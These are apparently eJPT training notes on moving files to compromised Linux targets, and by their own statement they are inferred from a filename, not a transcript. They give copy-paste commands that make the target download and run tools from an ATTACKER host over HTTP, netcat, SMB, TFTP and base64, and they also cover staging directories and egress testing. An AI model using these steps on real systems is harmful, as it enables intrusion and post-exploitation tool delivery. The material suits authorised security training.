# Transferring Files To Linux Targets (eJPT) — Summary Notes

Note: No transcript was provided. The following is a careful, conservative summary inferred from the filename and course context. It covers standard, exam-relevant methods and commands to move files to Linux targets during internal/external assessments.

## What the video covers (Introduction / big picture)
- Why and how to transfer files to Linux targets during engagements (e.g., enumeration scripts, privesc tools, custom binaries).
- Picking a staging directory (e.g., /tmp, /dev/shm) and dealing with permissions.
- Multiple transfer channels: HTTP(S), SCP/SFTP/rsync over SSH, Netcat, SMB, TFTP, Python/BusyBox fallbacks, and base64 copy-paste.
- Verifying integrity, setting executable bits, and handling restricted egress networks.

## Flow (ordered)
1. Identify a writable, low-friction directory on the target (usually /tmp or /dev/shm).
2. Check egress/ingress constraints (which ports and protocols work).
3. Choose a transfer method that fits the network constraints and available tooling on the target.
4. Start a server/listener on the attacker, or leverage SSH if you have credentials.
5. Pull from target (wget/curl/scp) or push from attacker (scp/nc/smb).
6. Verify integrity and adjust permissions (chmod +x).
7. Execute or use the file and clean up if appropriate.

## Tools highlighted
- HTTP servers: python3 -m http.server
- Downloaders on Linux: wget, curl, busybox wget/tftp/nc
- SSH-based: scp, sftp, rsync
- Raw sockets: nc (netcat), socat
- SMB: impacket-smbserver, smbclient, mount -t cifs
- TFTP: tftp/busybox tftp (optional, legacy)
- Fallbacks: python3 urllib, base64, tar over nc/ssh
- Integrity/metadata: sha256sum, file, chmod, uname

## Typical command walkthrough (detailed, copy-paste friendly)

Replace placeholders as needed:
- ATTACKER: your attack box IP (e.g., 10.10.14.2)
- TARGET: target IP/hostname
- FILE: filename to transfer (e.g., linpeas.sh)
- USER: valid username for SSH-based transfers

### A) HTTP(S) pull (most common)
Attacker (serve the current directory):
```bash
cd /path/to/files
python3 -m http.server 8000
# If only 80/443 allowed:
# sudo python3 -m http.server 80
# sudo python3 -m http.server 443
```

Target (pull with wget or curl):
```bash
cd /tmp
# wget (quiet, write to specific path)
wget -qO /tmp/FILE http://ATTACKER:8000/FILE

# curl (fail-silent but show errors; save to path)
curl -fsSLo /tmp/FILE http://ATTACKER:8000/FILE

# If HTTPS with self-signed cert:
curl -kfsSLo /tmp/FILE https://ATTACKER:443/FILE

chmod +x /tmp/FILE
sha256sum /tmp/FILE  # optional integrity check
```

Fallback if wget/curl missing but Python exists:
```bash
python3 - <<'PY'
import urllib.request
urllib.request.urlretrieve("http://ATTACKER:8000/FILE", "/tmp/FILE")
PY
chmod +x /tmp/FILE
```

BusyBox fallback:
```bash
busybox wget -O /tmp/FILE http://ATTACKER:8000/FILE
chmod +x /tmp/FILE
```

### B) SCP/SFTP/rsync over SSH
If you have SSH access to the target.

Attacker (push with scp):
```bash
# Key-based (recommended) or password-based
scp -P 22 FILE USER@TARGET:/tmp/

# If non-standard SSH port and key
scp -i id_rsa -P 2222 FILE USER@TARGET:/tmp/
```

Target (pull from attacker over SSH — ensure SSH server running on attacker):
```bash
# On attacker: start SSH server if needed
sudo systemctl enable --now ssh

# On target: pull file
scp -P 22 USER@ATTACKER:/path/to/FILE /tmp/FILE
```

rsync (resumable, efficient):
```bash
rsync -avP -e 'ssh -p 22' FILE USER@TARGET:/tmp/
```

Non-interactive SFTP:
```bash
sftp -P 22 USER@TARGET <<'EOF'
put FILE /tmp/FILE
ls -l /tmp/FILE
EOF
```

### C) Netcat (nc) — simple raw transfer
If only outbound from target is allowed, make the target connect to your listener.

Attacker (serve file):
```bash
# OpenBSD nc: close after EOF (-q 0)
nc -q 0 -lvnp 4444 < FILE
```

Target (connect and save):
```bash
nc -nv ATTACKER 4444 > /tmp/FILE
chmod +x /tmp/FILE
```

Transfer a directory via tar over nc:
```bash
# Attacker
tar czf - mydir | nc -q 0 -lvnp 4444

# Target
cd /tmp
nc -nv ATTACKER 4444 | tar xzf -
```

socat alternative (more robust):
```bash
# Attacker
socat -u FILE:FILE TCP-LISTEN:4444,reuseaddr

# Target
socat -u TCP:ATTACKER:4444 OPEN:/tmp/FILE,creat,write
chmod +x /tmp/FILE
```

### D) SMB share (fast for many files; anonymous possible)
Attacker (host SMB share from current dir):
```bash
# Requires impacket
impacket-smbserver -smb2support share $(pwd)
```

Target (download with smbclient):
```bash
# Anonymous (-N); if creds needed use -U 'user%pass'
smbclient //ATTACKER/share -N -c "get FILE /tmp/FILE"
chmod +x /tmp/FILE
```

Optional mount (needs privileges):
```bash
sudo mkdir -p /mnt/smb
sudo mount -t cifs //ATTACKER/share /mnt/smb -o guest,vers=3.0
cp /mnt/smb/FILE /tmp/FILE
sudo umount /mnt/smb
chmod +x /tmp/FILE
```

### E) TFTP (legacy/UDP 69; insecure; only if available)
Attacker (simple TFTP server setup on Debian-like):
```bash
sudo apt-get update && sudo apt-get install -y atftp tftpd-hpa
sudo mkdir -p /srv/tftp && sudo cp FILE /srv/tftp/
# Ensure tftpd-hpa is serving /srv/tftp on UDP 69
sudo systemctl restart tftpd-hpa
```

Target:
```bash
# BSD tftp client syntax
tftp ATTACKER -c get FILE /tmp/FILE

# BusyBox variant
busybox tftp -g -r FILE -l /tmp/FILE ATTACKER
chmod +x /tmp/FILE
```

### F) Base64 copy-paste (last resort)
Attacker:
```bash
base64 -w 0 FILE > FILE.b64
```

Target:
```bash
cat > /tmp/FILE.b64 <<'EOF'
PASTE_BASE64_DATA_HERE
EOF
base64 -d /tmp/FILE.b64 > /tmp/FILE
chmod +x /tmp/FILE
```

### G) Environment/proxy helpers and verification
Proxy-aware pulls:
```bash
# If a proxy is required
export http_proxy=http://PROXY:PORT
export https_proxy=http://PROXY:PORT
curl -fsSLo /tmp/FILE http://ATTACKER:8000/FILE
```

Check writeable locations and architecture:
```bash
# Staging dirs commonly writeable
ls -ld /tmp /dev/shm /var/tmp

# Verify binary compatibility
file /tmp/FILE
uname -m
sha256sum /tmp/FILE
```

Test egress from target:
```bash
nc -zvw2 ATTACKER 80 443 8080 22 445 69
```

## Practical tips
- Prefer /tmp or /dev/shm for staging; avoid privileged paths without root.
- If HTTP fails on uncommon ports, try 80 or 443; use sudo to bind low ports.
- Always set executable permission for scripts/binaries (chmod +x).
- Verify integrity with sha256sum when moving large or critical files.
- If tools are missing on target (no wget/curl), try BusyBox, Python urllib, or base64.
- For large transfers or flaky links, use rsync -P or curl -C - to resume.
- SMB is great for bulk transfer; anonymous SMB may be blocked—be ready to authenticate.
- Keep filenames simple (no spaces) and use absolute paths to avoid confusion.
- Be mindful of egress-only environments; choose pull methods (HTTP/HTTPS, outbound nc) accordingly.

## Minimal cheat sheet (one-screen flow)

HTTP server and wget/curl:
```bash
# Attacker
cd /path/to/files && python3 -m http.server 8000

# Target
cd /tmp
wget -qO /tmp/FILE http://ATTACKER:8000/FILE || curl -fsSLo /tmp/FILE http://ATTACKER:8000/FILE
chmod +x /tmp/FILE
```

SCP (push or pull):
```bash
# Push (attacker -> target)
scp -P 22 FILE USER@TARGET:/tmp/

# Pull (target <- attacker; ensure SSH server on attacker)
scp -P 22 USER@ATTACKER:/path/to/FILE /tmp/FILE
```

Netcat:
```bash
# Attacker (serve file)
nc -q 0 -lvnp 4444 < FILE

# Target (receive)
nc -nv ATTACKER 4444 > /tmp/FILE && chmod +x /tmp/FILE
```

SMB:
```bash
# Attacker
impacket-smbserver -smb2support share $(pwd)

# Target
smbclient //ATTACKER/share -N -c "get FILE /tmp/FILE" && chmod +x /tmp/FILE
```

Base64:
```bash
# Attacker
base64 -w 0 FILE > FILE.b64

# Target
cat > /tmp/FILE.b64 <<'EOF'
PASTE_BASE64_HERE
EOF
base64 -d /tmp/FILE.b64 > /tmp/FILE && chmod +x /tmp/FILE
```

## Summary
This module focuses on reliable, exam-ready techniques to transfer files to Linux targets:
- Use HTTP(S) with wget/curl as the default pull method, served by python3 -m http.server.
- Leverage SSH-based scp/sftp/rsync when credentials or keys are available.
- Fall back to nc/socat, SMB, TFTP, Python urllib, or base64 when constrained.
- Stage in /tmp or /dev/shm, set executable bits, and verify integrity.
- Adapt to network constraints (ports, proxies, egress-only) by selecting appropriate methods.